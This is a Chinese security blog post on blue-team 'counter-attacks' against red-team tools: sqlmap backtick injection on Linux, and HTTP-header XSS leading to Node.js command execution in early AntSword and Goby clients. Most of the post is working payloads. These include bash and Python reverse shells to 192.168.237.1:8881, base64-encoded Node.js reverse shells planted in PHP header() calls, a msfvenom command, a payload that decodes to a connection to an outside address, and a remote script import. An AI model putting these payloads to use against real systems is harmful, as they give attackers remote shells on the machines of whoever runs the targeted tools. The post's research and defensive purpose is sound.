#  第120篇：蓝队溯源之蚁剑、sqlmap、Goby反制方法的复现与分析   
 小黑说安全   2025-05-03 03:13  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png "")  
##   
##  Part1 前言   
  
大家好，我是  
ABC_123。最近在更新蓝队分析研判工具箱中的溯源反制功能时，我阅读了大量相关的技术文章。很多资料提到了早期版本的蚁剑、sqlmap、goby等工具的反制思路，其中的一些方法非常有参考价值。不过，ABC_123在复现过程中发现，许多文章中提供的payload复现不成功，经过多次转载后原始正确的payload会出现一些字符被无意中改为全角字符、Tab被替换为空格等问题，有些payload也需要修改。经过仔细研究和修正，今天写文章把复现过程和payload分享给大家。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450Dq1Q8s4COc7InkMO0jIGjiaGho1fcJicpibWB4vzvIM1wAib9TiakVECbIM5S0mHCTTeGJJibWtCe25vXw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
##  Part2 技术研究过程   
## sqlmap的反制方法  
## 在分析sqlmap反制手法时发现，严格来说这并不是sqlmap本身存在的问题，而是通过精心构造的反引号命令注入，诱使红队人员在特定环境下执行恶意命令。需要注意的是，这种攻击方式仅在Linux环境下使用sqlmap时才可能生效。虽然利用条件较为苛刻，但在某些特定场景下仍然具备可行性。例如，一些红队人员习惯通过BurpSuite结合sqlmap进行自动化注入测试，此时如果未对请求内容进行严格审查，就可能在无意中触发恶意payload，导致被蓝队反制。  
  
在  
Linux系统的Shell控制台中，反引号包裹的内容会被当作系统命令执行，并且其执行优先级较高。例如，可以通过在URL中插入反引号来执行一个简单的命令，比如列目录内容：  
```
sqlmap -u "http://192.168.237.128:8888/renli/
baoxian_jibenopen.asp?id=`ls`" 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwcAWUZxZviaBLfibSaqaRfIa2jMia5SnpWn4r8Ol6mHTAG6cfE3UvTOtHQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
也可以直接构造payload使红队人员执行反弹s  
hell命令，网上常见的一种payload是：  
```
sqlmap -u "http://192.168.237.128:8888/renli/baoxian_jibenopen
.asp?id=`bash -i >& /dev/tcp/192.168.237.1/8881 0>&1`" 
```  
  
但是我实际测试的时候，发现并未成功，如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqw4WguGpulefEKLpSgib3TtJgj3PObxvu1UR0tbXd3Ticab02bAqhVsZpw/640?wx_fmt=png&from=appmsg "")  
  
  
于是我想到  
sqlmap本身是基于python编写并运行的，那么目标环境中必然存在python解析器。于是构造了一下python代码，成功实现了反弹shell。修改后的payload如下：  
```
sqlmap -u "http://192.168.237.128:8888/renli/baoxian_jibenopen
.asp?id=`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.237.1",8881));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'`"
```  
  
通过这种方式，当红队人员利用  
sqlmap进行注入测试时，如果未对参数进行严格校验，便可能在不知情的情况下触发反弹shell操作，从而被蓝队人员成功反制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwNHK4AUBtneRAHzrqojLsh8lTVSUIQQlBWW9RPNzCXTrZFybiaDD8rCg/640?wx_fmt=png&from=appmsg "")  
##   
## 蚁剑的反制方法  
## 经过ABC_123的测试，发现这一方法仅适用于早期版本（AntSword <=2.0.7）的蚁剑webshell管理工具，在最新版本中已无法复现成功。需要注意的是，目前网上流传的许多payload在实际测试中并不可用，存在较多失效或拼写错误的情况。该反制方法的典型应用场景是：蓝队在发现红队上传的PHP等类型的WebShell后，可以主动在红队人员的WebShell中插入特制的反制代码。当红队人员后续使用蚁剑客户端连接该WebShell时，就会在不知情的情况下执行蓝队人员事先植入的命令，从而达到反制效果。  
  
首先，给出一个基于  
XSS的反制payload，可以用来做弹窗测试。  
```
<?php header("HTTP/1.1 500 <img src=1 onerror=alert(1) />") ?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwFogru8Ww27RFefqf4VondG2iafGYklM8hg0fqG3ahQtKZ4llfvhLfwg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwhCoTHG9QiaRZIvbL0WKsNmPyQVuicGK3HvRn78JuaUchUK1lyWAOYKiaA/640?wx_fmt=png&from=appmsg "")  
  
  
为了实现在  
Node.js版本蚁剑（AntSword）客户端中自动执行calc.exe命令，可以插入如下的PHP代码：当红队人员使用蚁剑客户端连接此webshell时，该PHP代码会返回一个带有恶意payload的HTTP响应头。  
```
<?php
header("HTTP/1.1 500 Not \<img src=# onerror=
'eval(new Buffer(`Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmV4ZWMoJ2NhbGMuZXhlJyk7`,`base64`).toString())'>");
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwWCia1JaXvDiaXTibfGppEzDBqbgkad1Kf9XYeB78clicia3l5dRyyayPk3A/640?wx_fmt=png&from=appmsg "")  
  
  
  
具体原理是：蚁剑（  
Node.js版）在与WebShell通信时，会解析服务器返回的数据。这段PHP代码构造了一个伪造的HTTP 500错误响应，并在响应状态行后插入了一个带onerror事件的<img>标签。当蚁剑客户端解析响应时，如果处理不严格，就会在Node.js环境中直接执行这段JavaScript。onerror中触发的JavaScript首先通过  
Base64解码出真实代码，内容是调用  
Node.js的child_process.exec模块，执行calc.exe程序，从而实现远程命令执行（RCE）。如果把旧的 new Buffer(...) 统一改成为标准的 Buffer.from(...)，此攻击代码可以兼容 Node.js 10+、12+、14+、16+、18+等版本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwJexhoqrTvduDNDXdBghrrd6FSh47jibIxrWn4WKQdEDic9iaiccJMpEDDQ/640?wx_fmt=png&from=appmsg "")  
  
  
接下来可以尝试实现反弹shell操作，于是构造如下代码。通过引入  
net和child_process模块，程序分别实现了建立TCP连接和启动本地Shell进程的功能。根据操作系统类型判断，如果是Windows系统则调用cmd.exe，否则使用/bin/sh。随后，使用child_process.spawn以交互模式启动Shell进程，并将其标准输入、输出和错误输出通过pipe方式进行控制。net.Socket对象提供了对底层Socket接口的读写能力，代码中创建了一个client对象，通过TCP连接到攻击者指定的IP和端口，将本地Shell的输入输出流重定向到该连接，实现了远程受控的交互式Shell访问。  
```
const net = require("net");
const cp = require("child_process");
const isWindows = process.platform === "win32";
const shell = isWindows ? "cmd.exe" : "/bin/sh";
const sh = cp.spawn(shell, ['-i'], {
stdio: ['pipe', 'pipe', 'pipe']
});
const client = new net.Socket();
client.connect(192.168.237.1, "8881", function () {
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
```  
  
最终将上述nodejs代码进行base64位编码形成如下payload。  
```
<?php
header("HTTP/1.1 500 Not \<img src=# onerror=
'eval(new Buffer(`Y29uc3QgbmV0ID0gcmVxdWlyZSgibmV0Iik7CmNvbnN0IGNwID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwoKY29uc3QgaXNXaW5kb3dzID0gcHJvY2Vzcy5wbGF0Zm9ybSA9PT0gIndpbjMyIjsKY29uc3Qgc2hlbGwgPSBpc1dpbmRvd3MgPyAiY21kLmV4ZSIgOiAiL2Jpbi9zaCI7Cgpjb25zdCBzaCA9IGNwLnNwYXduKHNoZWxsLCBbJy1pJ10sIHsKICAgIHN0ZGlvOiBbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10KfSk7Cgpjb25zdCBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxOTIuMTY4LjIzNy4xLCAiODg4MSIsIGZ1bmN0aW9uICgpIHsKICAgIGNsaWVudC5waXBlKHNoLnN0ZGluKTsKICAgIHNoLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwp9KTs=`
,`base64`).toString())'>");
?>
```  
  
当红队人员点开蚁剑开始连接webshell时，将会在不知情的情况下，执行反弹shell的nodejs代码，从而被蓝队人员反制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwRDVuotEibN81aQoU2icKlOEELGXqhtIhHewERqFkGvegt3rBsYFhSYnQ/640?wx_fmt=png&from=appmsg "")  
  
  
除了上述方法，蚁剑的反制还可以与  
metasploit进行结合，使用msfvenom生成payload，然后进行深度利用。  
```
msfvenom -p nodejs/shell_reverse_tcp LHOST=
192.168.237.1 LPORT=8881 -f raw -o payload.js
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwK1lO8fVmJRszP4Du1ia6ghaib30RmkqKMic84uiaAkakZHEzEIMrL7JkIg/640?wx_fmt=png&from=appmsg "")  
```
<?php
header("HTTP/1.1 500 Not <img src=# onerror=
'eval(new Buffer(`KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDEwMDk5LCAiNjYuMjguNS4yIiwgZnVuY3Rpb24oKSB7IGNsaWVudC5zb2NrZXQucGlwZShzaC5zdGRpbik7IGlmICh0eXBlb2YgdXRpbC5wdW1wID09PSAidW5kZWZpbmVkIikgeyBzaC5zdGRvdXQucGlwZShjbGllbnQuc29ja2V0KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50LnNvY2tldCk7IH0gZWxzZSB7IHV0aWwucHVtcChzaC5zdGRvdXQsIGNsaWVudC5zb2NrZXQpOyB1dGlsLnB1bXAoc2guc3RkZXJyLCBjbGllbnQuc29ja2V0KTsgfSB9KTsgc29ja2V0Lm9uKCJlcnJvciIsIGZ1bmN0aW9uKGVycm9yKSB7IGNvdW50ZXIrKzsgaWYoY291bnRlcjw9IDEwKXsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgU3RhZ2VyUmVwZWF0KCk7fSwgNSoxMDAwKTsgfSBlbHNlIHByb2Nlc3MuZXhpdCgpOyB9KTsgfSBTdGFnZXJSZXBlYXQoKTsgfSkoKTs=`
,`base64`).toString())'>");
?>
```  
  
## Goby早期版本的反制方法  
## 在研究针对Goby工具的反制方法时，我发现网上流传的许多payload在实际测试中均无法成功复现。经过分析，对部分payload进行了调整，最终才能测试成功。为了触发Goby客户端的XSS弹窗，可以在正常的网页php文件中插入以下PHP代码。  
```
<?php
header("X-Powered-By: PHP/<img src=1 onerror=alert(\"xxxxx\")>");
?>
```  
  
  
  
当红队人员使用Goby工具扫描192.168.237.128这个IP地址时，Goby通过端口扫描会访问到该IP的80端口的web服务，会访问到植入了恶意代码的页面。由于未对解析HTTP响应头进行严格过滤，就可能直接在Goby客户端触发XSS弹窗，从而实现对红队人员的初步反制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwf2ICQoicVekk0omctndyPYNo91vmxfAfuhIl5uZuzqHib4wBOoOsIIicQ/640?wx_fmt=png&from=appmsg "")  
  
  
当红队人员查看扫描结果，并点击ip地址附近区域时，会触发弹窗。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwnKIC4XFia7H08rgDPAYbh0clWwSdNVY3H32d8hmPOXQiboRs1XIEbRfQ/640?wx_fmt=png&from=appmsg "")  
  
  
如下图所示，成功弹框，证明反制代码被执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwHHQQIPmhIpnlN9n5UZNewjFsV6NtJPehaeHbbPSjhzcKlb7UyMTpdA/640?wx_fmt=png&from=appmsg "")  
  
  
经过反复修改与测试，最终实现执行  
calc.exe命令的PHP代码如下：以下代码通过设置特殊的HTTP响应头，在响应中插入一个带有onerror事件的<img>标签。当Goby等基于Node.js环境的客户端访问该页面时，若未对返回内容进行严格校验，onerror触发后会在客户端直接执行JavaScript代码，调用Node.js的child_process.exec模块，从而在本地弹出计算器(calc.exe)，实现命令执行效果。  
```
<?php
header("X-Powered-By: PHP/<img src=x onerror=
eval('require(\"child_process\").exec(\"calc.exe\")')>");
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwaibV8yQKibDudiaaSic6yB8CSTQbtqxleJib6WLW9BgDicAOSnlmjfVOUmIA/640?wx_fmt=png&from=appmsg "")  
  
  
接下来使用goby对该ip进行扫描，发现成功弹出计算器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwkaChVFL9S3KAhT3AgxVic6bL25icu6fmdRic5SPoGGyXskJPCKNiaibf2WA/640?wx_fmt=png&from=appmsg "")  
  
  
接下来就是反弹  
shell的命令，我的测试结果是，无论如何修改nodejs代码，都始终测试不成功，目前原因不得而知。具体操作步骤如下，在目标网站的某个  
PHP文件中插入如下代码，构造恶意HTTP响应头：使用goby扫描该ip地址后，http服务会收到请求，但是nodejs代码并没有执行。  
```
<?php
header("X-Powered-By: PHP/<img src=1 onerror=import(unescape('http%3A//192.168.237.1%3A8881/calc.js'))>");
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dgf1WvVAEJt7ztNHgLuicqwEXuXmFxvkBupWJEmJicKw9zIAnvC7ibv5sAfsK0VkPEOZPZYyTug6CnQ/640?wx_fmt=png&from=appmsg "")  
  
  
其中，弹计算器的  
calc.js文件代码如下，当Goby客户端加载此calc.js文件代码后执行（未能测试成功）。  
```
(function(){
require('child_process').exec('calc');
})();
```  
  
用于反弹  
Shell（Linux环境）的js文件代码如下（未能测试成功）。  
```
(function(){
require('child_process').exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.237.1",8881));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'');
})();
```  
  
  
##  Part3 总结   
  
1.  
  在复现蚁剑、  
sqlmap、goby反制过程中，发现网上流传的很多payload存在错误，往往是由于反复复制传播时命令格式、字符编码被篡改。实际测试中，一定要以原理为基础自行验证，切勿盲目相信网上的现成复制内容。  
  
2.  
  蚁剑、  
sqlmap、goby等的反制方法，并没有依赖目标网站应用漏洞，而是针对红队人员所使用的工具在自身解析、处理逻辑中的缺陷进行攻击。例如：利用蚁剑早期版本对返回内容解析不严格触发远程命令执行；利用  
sqlmap在Linux下shell解析反引号导致命令执行。  
  
3.  
  蓝队反制可以不直接入侵红队，只需在  
webshell、接口返回的数据中插入特制payload，诱导红队工具自动触发执行。  
  
4.  
  蓝队人员可以适配攻击者使用环境而有针对性地构造  
payload，比如：针对Node.js环境设计的反制蚁剑 payload，针对Linux环境设计的sqlmap反弹Shell命令；必须了解攻击者工具运行依赖的解释器或执行环境（Node.js、Python等），才能制定有效反制策略。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**公众号专注于网络安全技术，包括安全咨询、APT事件分析、红队攻防、蓝队分析、渗透测试、代码审计等，99%原创，敬请关注。**  
  
**Contact me: 0day123abc#gmail.com**  
  
**(replace # with @)**  
  
  
